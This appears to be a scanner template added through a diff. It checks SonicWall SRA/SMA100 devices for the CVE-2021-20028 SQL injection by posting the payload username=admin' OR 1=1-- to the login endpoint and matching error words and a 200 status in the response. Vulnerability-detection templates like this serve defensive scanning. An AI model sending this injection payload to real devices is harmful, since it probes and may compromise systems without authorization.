@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "检测 SonicWall SRA/SMA100 设备是否存在 CVE-2021-20028 SQL 注入漏洞，通过发送包含 SQL 注入 payload 的登录请求，若响应中包含 SQL 错误或异常则表明目标存在漏洞。"
+id = "POC-AVE-2021-0168"
+name = "SonicWall SRA SQL Injection PoC"
+severity = "critical"
+tags = ["ave-2021-0168"]
+vuln_id = [
+    "CVE-2021-20028",
+    "AVE-2021-0168",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/sessionLogin"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin'%20OR%201=1--&password=test&state=login"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "syntax",
+    "SQL",
+    "ORA",
+    "mysql",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
